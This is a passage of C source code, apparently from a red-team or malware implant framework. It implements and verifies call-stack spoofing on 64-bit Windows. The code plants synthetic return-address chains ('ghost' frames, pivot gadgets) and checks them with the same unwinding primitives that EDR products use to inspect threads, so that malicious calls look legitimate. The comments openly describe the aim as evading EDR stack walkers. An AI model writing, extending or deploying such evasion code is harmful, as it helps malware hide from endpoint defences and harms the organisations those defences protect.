        sp->Arg4 = (PVOID)a[3];
        sp->StackArgs = (PVOID)&a[4];
        return ghost_spoof_call_args(sp);
    }
#endif // !MODULE_STOMP_OVERLOAD

    // fallback (primitives unavailable / unsupported arg count): direct
    // call. The retired stomp windows used to wrap this; see file header.
    return ((FN11)pTarget)(a[0],a[1],a[2],a[3],a[4],a[5],
                           a[6],a[7],a[8],a[9],a[10]);
}

// ============================================================================
// Self-verification probe - runs as the TARGET of a spoofed call. While it
// executes, everything below RSP is the planted chain; the manual
// RtlCaptureContext + RtlVirtualUnwind walk (the primitive exception
// dispatch and EDR stack walkers use) must traverse it.
// ============================================================================

typedef USHORT (WINAPI *fn_RtlCaptureStackBackTrace_t)(ULONG, ULONG, PVOID*, PULONG);
typedef SIZE_T (WINAPI *fn_VirtualQuery_t)(LPCVOID, PVOID, SIZE_T);

static fn_RtlCaptureStackBackTrace_t g_pCap = NULL;
static fn_VirtualQuery_t             g_pVQ  = NULL;
static fn_RtlLookupFunctionEntry_t   g_pLFE = NULL;
static fn_RtlVirtualUnwind_t         g_pVU  = NULL;

static VOID NTAPI cs_probe_target(PINSTANCE inst) {
    PGHOST_SPOOFER sp = &inst->GhostSpoofer;

    // ground truth: registers + raw qwords. On a spoofed (teleported) call
    // the synthetic window base R is recorded in PivotWindowRsp - dump the
    // WINDOW itself (pivot RA, args, chain, machframe) so every planted
    // slot is verifiable offline; a direct call has no window (field
    // stale/zero) and captures from the real rsp as before.
    {
        UINT64 rsp = 0, rbp = 0;
        __asm__ volatile("mov %0, rsp" : "=r"(rsp));
        __asm__ volatile("mov %0, rbp" : "=r"(rbp));
        UINT64 base = (UINT64)sp->PivotWindowRsp;
        if (!base || base < rsp - 0x2000 || base > rsp + 0x2000)
            base = rsp;
        sp->ProbeRsp = rsp;
        sp->ProbeRbp = rbp;
        for (int i = 0; i < 48; i++)
            sp->ProbeStack[i] = ((UINT64*)base)[i];
    }

    // chain leaf-validation: L1..L4 must NOT resolve to any RUNTIME_FUNCTION
    // (leaf = free 8-byte pop). Gadget and L5 live in real metadata on
    // purpose. Encoded into ProbeStack[32..35]: 1 = leaf-OK, 0 = covered(bad).
    if (g_pLFE) {
        PVOID chain[4] = { sp->L1Ghost, sp->L2Ghost, sp->L3Ghost, sp->L4NopGap };
        for (int i = 0; i < 4; i++) {
            UINT64 ib = 0;
            sp->ProbeStack[32 + i] =
                (chain[i] && !g_pLFE((UINT64)chain[i], &ib, NULL)) ? 1 : 0;
        }
    }

    // dynamic-table lookup sanity for our own function
    {
        UINT64 rip = 0;
        __asm__ volatile("lea %0, [rip]" : "=r"(rip));
        UINT64 ib = 0;
        PVOID fe = g_pLFE ? g_pLFE(rip, &ib, NULL) : NULL;
        sp->LookupEntry = (UINT64)fe;
        sp->LookupBase  = ib;
    }

    // RtlCaptureStackBackTrace's INTERNAL walker (RtlpWalkFrameChain ->
    // RtlVirtualUnwind) has no notion of chain membership: on a ghost-stomped
    // stack it pops a planted ghost, then reads the adjacent parent-frame
    // garbage qword, "resolves" it into some covered ntdll function and
    // unwinds it with a garbage Rsp until it walks off the stack - AV inside
    // ntdll!RtlVirtualUnwind2 (T2 2026-11-09, dump-verified). Only run it when
    // the stack is NOT planted; the gated manual walk above carries the
    // verification for the stomp path.
    if (!g_pCap || sp->bPlanted) return;

    // manual walk with a REAL context - the exact primitive EDR walkers use.
    // Expected: [probe][gadget][L1..L4 ghosts][L5 thread root -> real chain].
    if (g_pVU && g_pLFE) {
        CONTEXT ctx;
        es_memset(&ctx, 0, sizeof(ctx));
        ctx.ContextFlags = 0x100005;   // CONTEXT_FULL
        typedef void (WINAPI *fn_RtlCaptureContext_t)(PVOID);
        fn_RtlCaptureContext_t pCC = (fn_RtlCaptureContext_t)(void*)inst->Win32.GetProcAddress(
            (HMODULE)inst->Modules.Ntdll, "RtlCaptureContext");
        if (pCC) {
            pCC(&ctx);
            PVOID wf[24];
            DWORD wn = 0;
            // Chain-membership-gated leaf walk. An uncovered address is only
            // popped when it is one of OUR planted frames (gadget / L1..L4):
            // those sit consecutively in the planted window, so the pop is
            // valid by construction. Popping anything else walks parent-frame
            // saved registers (which often resolve into covered ntdll code)
            // and feeds RtlVirtualUnwind a garbage Rsp - it dereferences it
            // and dies (AV inside ntdll!RtlVirtualUnwind2, verified T2
            // 2026-11-09). Break on the first unknown uncovered frame.
            UINT64 chainSet[5];
            chainSet[0] = (UINT64)sp->GhostGadget;
            chainSet[1] = (UINT64)sp->L1Ghost;
            chainSet[2] = (UINT64)sp->L2Ghost;
            chainSet[3] = (UINT64)sp->L3Ghost;
            chainSet[4] = (UINT64)sp->L4NopGap;
            UINT64 stackBase = (UINT64)__readgsqword(0x08);
            for (int i = 0; i < 24; i++) {
                UINT64 ib2 = 0;
                PVOID fe2 = g_pLFE(ctx.Rip, &ib2, NULL);
                if (!fe2) {
                    BOOL ours = FALSE;
                    for (int k = 0; k < 5; k++)
                        if (chainSet[k] && ctx.Rip == chainSet[k]) { ours = TRUE; break; }
                    if (!ours || wn == 0 || ctx.Rsp + 8 > stackBase)
                        break;      // unknown leaf / probe uncovered / off-stack
                    wf[wn++] = (PVOID)(UINT_PTR)ctx.Rip;
                    ctx.Rip = *(UINT64*)ctx.Rsp;
                    ctx.Rsp += 8;
                } else {
                    if (wn < 24) wf[wn++] = (PVOID)(UINT_PTR)ctx.Rip;
                    if (!cs_sane_unwind(ib2, fe2)) break;   // garbage unwind info: stop
                    PVOID handler = NULL;
                    PVOID est = NULL;
                    g_pVU(0, ib2, ctx.Rip, fe2, &ctx, &handler, &est, 0);
                }
                if (ctx.Rip == 0) break;
            }
            sp->WalkFrameChainCount = wn;
            // the walk frames go to the SECOND half of ProbeStack: the first
            // half holds the raw synthetic-window dump taken at entry, which
            // must survive for offline slot-by-slot verification
            for (int i = 0; i < wn && i < 24; i++)
                sp->ProbeStack[24 + i] = (UINT64)wf[i];
            // carry the walk result as the reported frames; RtlCaptureStackBackTrace
            // below overwrites them with its (authoritative) result when the
            // stack is clean enough to walk with ntdll's internal walker
            for (int i = 0; i < (int)wn && i < 24; i++)
                sp->ProbeFrames[i] = wf[i];
            sp->ProbeCount = wn;
            // where the walk STOPPED: the RA it could not classify - the
            // offline analysis pairs this with the window dump
            sp->VUnwindNextRip = ctx.Rip;
            sp->VUnwindNextRsp = ctx.Rsp;
        }
    }

    PVOID  frames[24] = {0};
    USHORT n = g_pCap(0, 24, frames, NULL);
    if (n > 24) n = 24;

    MEMORY_BASIC_INFORMATION mbi;
    for (USHORT i = 0; i < n; i++) {
        sp->ProbeFrames[i] = frames[i];
        sp->ProbeTypes[i]  = 0;
        sp->ProbeBases[i]  = NULL;
        if (g_pVQ && g_pVQ(frames[i], &mbi, sizeof(mbi)) == sizeof(mbi)) {
            sp->ProbeTypes[i] = mbi.Type;          // MEM_IMAGE=0x1000000
            sp->ProbeBases[i] = mbi.AllocationBase;
        }
    }
    sp->ProbeCount = n;
}

BOOL callstack_spoof_verify(PINSTANCE inst, BOOL bSpoofed) {
    if (!inst->bCallstackSpoofInit) return FALSE;

    g_pCap = (fn_RtlCaptureStackBackTrace_t)(void*)inst->Win32.GetProcAddress(
        (HMODULE)inst->Modules.Kernel32, "RtlCaptureStackBackTrace");
    g_pVQ  = (fn_VirtualQuery_t)(void*)inst->Win32.VirtualQuery;
    g_pLFE = (fn_RtlLookupFunctionEntry_t)(void*)inst->Win32.GetProcAddress(
        (HMODULE)inst->Modules.Ntdll, "RtlLookupFunctionEntry");
    g_pVU  = (fn_RtlVirtualUnwind_t)(void*)inst->Win32.GetProcAddress(
        (HMODULE)inst->Modules.Ntdll, "RtlVirtualUnwind");
    if (!g_pCap) return FALSE;

    if (bSpoofed) {
        // Probe through the PIVOT primitive (6 args) when available so the
        // walk validates the full >4-arg chain
        // [probe][pivot][gadget][L1..L4][anchor -> Rip=0] end to end;
        // cs_probe_target ignores the dummy extra args. Falls back to the
        // 1-arg (primitive-1) probe when no pivot was discovered.
        PGHOST_SPOOFER sp = &inst->GhostSpoofer;
        if (sp->PivotGadget && sp->PivotImm >= 0x28 && sp->MfAnchor) {
            callstack_spoofed_call(inst, (PVOID)cs_probe_target, 6,
                (UINT64)(UINT_PTR)inst, 0x1111, 0x2222, 0x3333, 0x4444, 0x5555);
        } else {
            callstack_spoofed_call(inst, (PVOID)cs_probe_target, 1, (UINT64)(UINT_PTR)inst);
        }
    } else {
        cs_probe_target(inst);
    }
    return inst->GhostSpoofer.ProbeCount > 0;
}

#endif // _WIN64
#endif // INCLUDE_EVASION_CALLSTACK_SPOOF
